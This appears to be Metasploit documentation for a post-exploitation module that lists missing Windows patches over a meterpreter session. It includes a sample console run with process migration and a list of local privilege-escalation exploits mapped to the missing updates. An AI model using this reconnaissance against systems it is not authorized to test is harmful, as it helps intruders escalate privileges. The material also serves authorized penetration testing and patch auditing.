
## Vulnerable Application

  This module will attempt to enumerate which patches are applied to a
  windows system based on the result of the WMI query: `SELECT HotFixID FROM Win32_QuickFixEngineering`.

## Verification Steps

  1. Start msfconsole
  2. Get meterpreter session
  3. Do: ```use post/windows/gather/enum_patches```
  4. Do: ```set SESSION <session id>```
  5. Do: ```run```

## Options

  **KB**

  A comma separated list of KB patches to search for. Default is: `KB2871997, KB2928120`

  **MSFLOCALS**

  Search for missing patches for which there is a MSF local module. Default is `true`.

  **SESSION**

  The session to run this module on.

## Scenarios

### Windows 7 (6.1 Build 7601, Service Pack 1).

  ```
  [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.10:49223) at 2019-12-14 08:37:46 -0700

  msf > use post/windows/gather/enum_patches
  msf post(windows/gather/enum_patches) > set SESSION 1
    SESSION => 1
  msf post(windows/gather/enum_patches) > run
    [-] Known bug in WMI query, try migrating to another process
    [*] Post module execution completed
  msf post(windows/gather/enum_patches) > sessions 1
    [*] Starting interaction with 1...
  meterpreter > run post/windows/manage/migrate

    [*] Running module against TEST-PC
    [*] Current server process: Explorer.EXE (1908)
    [*] Spawning notepad.exe process to migrate to
    [+] Migrating to 3992
    [+] Successfully migrated to process 3992
  meterpreter > background
    [*] Backgrounding session 1...
  msf post(windows/gather/enum_patches) > run

    [+] KB2871997 is missing
    [+] KB2928120 is missing
    [+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
    [+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
    [+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
    [+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
    [+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
    [+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
    [*] Post module execution completed
  ```
